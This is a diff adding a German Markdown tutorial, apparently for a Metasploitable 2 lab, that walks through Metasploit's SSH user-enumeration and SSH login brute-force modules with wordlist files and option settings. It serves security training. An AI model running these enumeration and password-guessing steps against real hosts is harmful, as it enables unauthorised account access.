@@ -1,0 +1,143 @@
+# SSH
+
+## Files erstellen
+
+User und Passwort File erstellen:
+
+``` bash
+cd Documents
+nano user.txt
+cp user.txt passwort.txt
+ls
+```
+
+![Bild01.jpg](/images/Metaspolitable-2/SSH/Bild01.jpg)
+
+## Starten der Metasploit-Konsole
+
+Wenn man einen Exploit gefunden hat, der mit Metasploit funktioniert, kann man das Metasploit-Tool verwenden, um den Exploit zu starten. Dafür muss man zuerst die Metasploit-Konsole starten:
+
+``` bash
+msfconsole
+```
+
+![Bild02.jpg](/images/Metaspolitable-2/SSH/Bild02.jpg)
+
+## Suche nach dem Exploit in der Metasploit-Konsole
+
+Nachdem die Konsole gestartet wurde, muss man noch nach dem Exploit suchen:
+
+``` bash
+search scanner/ssh/ssh
+```
+
+![Bild03.jpg](/images/Metaspolitable-2/SSH/Bild03.jpg)
+
+## Auswahl des Exploits
+
+=== "SSH-Enumusers"
+    Um den Exploit auszuwählen, gibt man den folgenden Befehl ein (0 = die Nummer des Exploits in der Liste):
+
+    ``` bash
+    use 3
+    ```
+
+    ![Bild04.jpg](/images/Metaspolitable-2/SSH/Bild04.jpg)
+
+    ## Anzeigen von Optionen
+
+    Mit dem folgenden Befehl kann man sich die zu konfigurierenden Optionen anzeigen lassen:
+
+    ``` bash
+    show options
+    ```
+
+    ![Bild05.jpg](/images/Metaspolitable-2/SSH/Bild05.jpg)
+
+    ## Optionen setzen
+
+    Danach kann man mit dem folgenden Befehl die Option setzen:
+
+    ``` bash
+    set RHOSTS <IP-Adresse>
+    ```
+
+    ![Bild06.jpg](/images/Metaspolitable-2/SSH/Bild06.jpg)
+
+    ``` bash
+    set USER_FILE <Pfad zur User.txt>
+    ```
+
+    ![Bild07.jpg](/images/Metaspolitable-2/SSH/Bild07.jpg)
+
+    ``` bash
+    set CHECK_FALSE true
+    ```
+
+    ![Bild08.jpg](/images/Metaspolitable-2/SSH/Bild08.jpg)
+
+    ## Starten des Exploits
+    Zum Schluss muss man mit dem folgenden Befehl den Exploit starten:
+
+    ``` bash
+    run
+    ```
+
+    ![Bild09.jpg](/images/Metaspolitable-2/SSH/Bild09.jpg)
+
+=== "SSH-Login"
+    Um den Exploit auszuwählen, gibt man den folgenden Befehl ein (0 = die Nummer des Exploits in der Liste):
+
+    ``` bash
+    use 0
+    ```
+
+    ![Bild10.jpg](/images/Metaspolitable-2/SSH/Bild10.jpg)
+
+    ## Anzeigen von Optionen
+
+    Mit dem folgenden Befehl kann man sich die zu konfigurierenden Optionen anzeigen lassen:
+
+    ``` bash
+    show options
+    ```
+
+    ![Bild11.jpg](/images/Metaspolitable-2/SSH/Bild11.jpg)
+
+    ## Optionen setzen
+
+    Danach kann man mit dem folgenden Befehl die Option setzen:
+
+    ```
+    set PASS_FILE <Pfad zur Passwort.txt>
+    ```
+
+    ![Bild12.jpg](/images/Metaspolitable-2/SSH/Bild12.jpg)
+
+    ```
+    set USER_FILE <Pfad zur User.txt>
+    ```
+
+    ![Bild13.jpg](/images/Metaspolitable-2/SSH/Bild13.jpg)
+
+    ```
+    set RHOSTS <IP-Adresse>
+    ```
+
+    ![Bild14.jpg](/images/Metaspolitable-2/SSH/Bild14.jpg)
+
+    ```
+    set VERBOSE true
+    ```
+
+    ![Bild15.jpg](/images/Metaspolitable-2/SSH/Bild15.jpg)
+
+    ## Starten des Exploits
+
+    Zum Schluss muss man mit dem folgenden Befehl den Exploit starten:
+
+    ``` bash
+    run
+    ```
+
+    ![Bild16.jpg](/images/Metaspolitable-2/SSH/Bild16.jpg)
